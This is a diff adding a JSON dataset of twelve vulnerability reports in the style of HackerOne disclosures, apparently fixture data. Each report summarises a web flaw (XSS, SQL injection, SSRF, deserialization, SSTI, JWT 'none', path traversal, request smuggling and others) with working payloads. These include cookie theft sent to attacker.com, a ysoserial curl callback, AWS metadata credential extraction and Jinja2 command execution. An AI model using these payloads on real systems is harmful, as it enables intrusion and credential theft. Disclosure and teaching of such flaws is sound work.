@@ -1,0 +1,122 @@
+[
+  {
+    "id": "1820801",
+    "title": "Reflected XSS in search parameter via unsanitized user input",
+    "weakness_name": "Cross-Site Scripting (XSS) - Reflected",
+    "weakness_cwe": "CWE-79",
+    "severity": "MEDIUM",
+    "disclosed_at": "2023-01-15",
+    "url": "https://hackerone.com/reports/1820801",
+    "vuln_info": "## Summary\nA reflected XSS vulnerability was discovered in the search functionality. The `q` parameter was reflected directly into the HTML response without proper sanitization.\n\n## Steps To Reproduce\n1. Navigate to https://target.com/search?q=test\n2. Replace the value of `q` with `<script>alert(document.cookie)</script>`\n3. The script executes in the victim's browser\n\n## Impact\nAn attacker can steal session cookies, redirect users to phishing sites, or perform actions on behalf of the victim. This can lead to account takeover if session tokens are accessible."
+  },
+  {
+    "id": "1749014",
+    "title": "SQL Injection in user profile endpoint allows database extraction",
+    "weakness_name": "SQL Injection",
+    "weakness_cwe": "CWE-89",
+    "severity": "CRITICAL",
+    "disclosed_at": "2023-03-20",
+    "url": "https://hackerone.com/reports/1749014",
+    "vuln_info": "## Summary\nA SQL injection vulnerability was found in the `/api/users/profile` endpoint. The `user_id` parameter is passed directly to a SQL query without parameterization.\n\n## Steps To Reproduce\n1. Send GET request to `/api/users/profile?user_id=1`\n2. Modify `user_id` to `1' UNION SELECT username,password,3 FROM users--`\n3. Response contains all usernames and hashed passwords from the database\n\n## Proof of Concept\n```\nGET /api/users/profile?user_id=1' UNION SELECT table_name,2,3 FROM information_schema.tables-- HTTP/1.1\nHost: target.com\n```\n\n## Impact\nComplete database extraction including user credentials, PII, and application secrets. This leads to full compromise of all user accounts."
+  },
+  {
+    "id": "1407728",
+    "title": "SSRF via URL parameter allows access to AWS metadata service",
+    "weakness_name": "Server-Side Request Forgery (SSRF)",
+    "weakness_cwe": "CWE-918",
+    "severity": "CRITICAL",
+    "disclosed_at": "2022-08-10",
+    "url": "https://hackerone.com/reports/1407728",
+    "vuln_info": "## Summary\nThe image import feature at `/api/import-image` makes server-side HTTP requests to user-supplied URLs without validation, allowing SSRF to the AWS EC2 metadata endpoint.\n\n## Steps To Reproduce\n1. Send POST request to `/api/import-image` with body: `{\"url\": \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\"}`\n2. Response includes available IAM role names\n3. Request `http://169.254.169.254/latest/meta-data/iam/security-credentials/[role-name]`\n4. Response includes `AccessKeyId`, `SecretAccessKey`, and `Token`\n\n## Impact\nFull AWS credential extraction enabling complete cloud infrastructure takeover. Attacker can read S3 buckets, access RDS databases, and pivot to other AWS services."
+  },
+  {
+    "id": "1065041",
+    "title": "IDOR vulnerability allows access to other users private data via API",
+    "weakness_name": "Insecure Direct Object Reference (IDOR)",
+    "weakness_cwe": "CWE-639",
+    "severity": "HIGH",
+    "disclosed_at": "2021-06-14",
+    "url": "https://hackerone.com/reports/1065041",
+    "vuln_info": "## Summary\nThe `/api/v2/orders/{order_id}` endpoint does not verify that the requesting user owns the order. By enumerating order IDs, an attacker can view other users' order details including PII.\n\n## Steps To Reproduce\n1. Log in as user A and create an order — note the order ID (e.g., 10045)\n2. Log in as user B\n3. Send `GET /api/v2/orders/10044` (adjacent ID belonging to user A)\n4. Response returns full order details including name, address, and payment info\n\n## Impact\nMass exposure of customer PII including home addresses, phone numbers, and partial payment information for all users. An attacker can enumerate all orders by iterating IDs."
+  },
+  {
+    "id": "759247",
+    "title": "Remote Code Execution via unsafe deserialization in session handling",
+    "weakness_name": "Deserialization of Untrusted Data",
+    "weakness_cwe": "CWE-502",
+    "severity": "CRITICAL",
+    "disclosed_at": "2020-04-22",
+    "url": "https://hackerone.com/reports/759247",
+    "vuln_info": "## Summary\nThe application deserializes user-controlled session data using Java's native ObjectInputStream without any validation. By crafting a malicious serialized payload using gadget chains (ysoserial), arbitrary code execution is achievable.\n\n## Steps To Reproduce\n1. Generate payload: `java -jar ysoserial.jar CommonsCollections6 'curl attacker.com/rce' | base64`\n2. Set the session cookie to the base64-encoded payload\n3. Send any authenticated request\n4. Server receives connection from attacker.com confirming RCE\n\n## Impact\nFull server compromise. Attacker can read all data, install backdoors, pivot to internal network, and achieve persistent access."
+  },
+  {
+    "id": "534450",
+    "title": "Stored XSS in profile bio field leads to account takeover",
+    "weakness_name": "Cross-Site Scripting (XSS) - Stored",
+    "weakness_cwe": "CWE-79",
+    "severity": "HIGH",
+    "disclosed_at": "2019-11-08",
+    "url": "https://hackerone.com/reports/534450",
+    "vuln_info": "## Summary\nThe user profile bio field stores and renders unsanitized HTML. By injecting a script that exfiltrates the viewer's cookies, any user who views the malicious profile is compromised.\n\n## Steps To Reproduce\n1. Update bio to: `<script>new Image().src='https://attacker.com/?c='+document.cookie</script>`\n2. Share profile URL to target victim\n3. When victim views profile, their session cookie is sent to attacker\n4. Attacker uses stolen cookie to hijack session\n\n## Impact\nOne-click account takeover. Can be scaled to a worm that spreads across social connections."
+  },
+  {
+    "id": "1353136",
+    "title": "XXE injection in XML document upload leads to internal file read",
+    "weakness_name": "XML External Entity (XXE) Injection",
+    "weakness_cwe": "CWE-611",
+    "severity": "HIGH",
+    "disclosed_at": "2022-02-18",
+    "url": "https://hackerone.com/reports/1353136",
+    "vuln_info": "## Summary\nThe document import feature accepts XML files and processes them with an XML parser that has external entity processing enabled. By crafting a malicious XML file with an external entity referencing internal files, sensitive data can be extracted.\n\n## Steps To Reproduce\n1. Create a file with content:\n```xml\n<?xml version=\"1.0\"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n<document><content>&xxe;</content></document>\n```\n2. Upload via POST /api/import\n3. Response includes contents of /etc/passwd\n\n## Impact\nRead arbitrary files on the server including configuration files with database credentials and private keys."
+  },
+  {
+    "id": "974607",
+    "title": "SSTI in email template engine allows RCE via Jinja2 injection",
+    "weakness_name": "Server-Side Template Injection (SSTI)",
+    "weakness_cwe": "CWE-94",
+    "severity": "CRITICAL",
+    "disclosed_at": "2021-03-05",
+    "url": "https://hackerone.com/reports/974607",
+    "vuln_info": "## Summary\nThe email customization feature allows users to inject Jinja2 template expressions into email subjects. The input is passed directly to the Jinja2 render engine without sandboxing.\n\n## Steps To Reproduce\n1. Navigate to email customization settings\n2. Set email subject to: `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`\n3. Trigger a test email\n4. Email subject contains the output of `id` command\n\n## PoC for RCE:\n`{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}`\n\n## Impact\nFull remote code execution on the application server. Complete system compromise."
+  },
+  {
+    "id": "425022",
+    "title": "Authentication bypass via JWT algorithm confusion (none algorithm)",
+    "weakness_name": "Improper Authentication",
+    "weakness_cwe": "CWE-287",
+    "severity": "CRITICAL",
+    "disclosed_at": "2018-12-03",
+    "url": "https://hackerone.com/reports/425022",
+    "vuln_info": "## Summary\nThe application accepts JWT tokens with the 'none' algorithm, allowing an attacker to forge tokens for any user without knowing the signing secret.\n\n## Steps To Reproduce\n1. Obtain a valid JWT token by logging in\n2. Decode the JWT (base64)\n3. Change the algorithm in the header to 'none'\n4. Change the user_id in the payload to target user (e.g., admin)\n5. Remove the signature (keep trailing dot)\n6. Re-encode and use as Bearer token\n\n## Payload:\n`eyJhbGciOiJub25lIn0.eyJ1c2VyX2lkIjoxfQ.` (admin access)\n\n## Impact\nComplete authentication bypass. Attacker can impersonate any user including administrators."
+  },
+  {
+    "id": "1236900",
+    "title": "Path traversal in file download endpoint exposes server files",
+    "weakness_name": "Path Traversal",
+    "weakness_cwe": "CWE-22",
+    "severity": "HIGH",
+    "disclosed_at": "2022-05-30",
+    "url": "https://hackerone.com/reports/1236900",
+    "vuln_info": "## Summary\nThe file download endpoint `/api/download?file=` does not properly sanitize the filename parameter, allowing path traversal to read arbitrary files.\n\n## Steps To Reproduce\n1. Send GET `/api/download?file=../../../etc/passwd`\n2. Server returns contents of /etc/passwd\n3. Try `/api/download?file=../../../var/www/html/.env`\n4. Returns application environment file with DB credentials and API keys\n\n## Bypasses:\n- URL encoding: `..%2F..%2F..%2Fetc%2Fpasswd`\n- Double encoding: `..%252F..%252F..%252Fetc%252Fpasswd`\n\n## Impact\nRead server-side files including source code, credentials, and configuration data."
+  },
+  {
+    "id": "904522",
+    "title": "HTTP Request Smuggling via CL.TE desync leads to cache poisoning",
+    "weakness_name": "HTTP Request Smuggling",
+    "weakness_cwe": "CWE-444",
+    "severity": "HIGH",
+    "disclosed_at": "2021-08-12",
+    "url": "https://hackerone.com/reports/904522",
+    "vuln_info": "## Summary\nThe application is vulnerable to HTTP request smuggling due to discrepancy in how the front-end proxy and back-end server interpret Transfer-Encoding and Content-Length headers.\n\n## Steps To Reproduce\n1. Send the following request:\n```\nPOST / HTTP/1.1\nHost: target.com\nContent-Length: 30\nTransfer-Encoding: chunked\n\n0\n\nGET /admin HTTP/1.1\nX-Ignore: x\n```\n2. Send a follow-up normal request\n3. The smuggled request causes the follow-up to be treated as accessing /admin\n\n## Impact\nCache poisoning, request hijacking, bypassing security controls, and accessing internal endpoints."
+  },
+  {
+    "id": "753567",
+    "title": "Open redirect in OAuth callback parameter enables phishing",
+    "weakness_name": "Open Redirect",
+    "weakness_cwe": "CWE-601",
+    "severity": "MEDIUM",
+    "disclosed_at": "2020-08-19",
+    "url": "https://hackerone.com/reports/753567",
+    "vuln_info": "## Summary\nThe OAuth `redirect_uri` parameter is not properly validated, allowing redirection to any external domain after authentication. This enables credential phishing using the trusted domain as a relay.\n\n## Steps To Reproduce\n1. Craft OAuth URL: `https://target.com/oauth/authorize?client_id=xxx&redirect_uri=https://evil.com&response_type=code`\n2. Send link to victim\n3. After victim authenticates, they are redirected to evil.com with the auth code\n4. Attacker exchanges code for access token\n\n## Impact\nOAuth token theft leading to account takeover. Effective phishing because URL starts with trusted domain."
+  }
+]
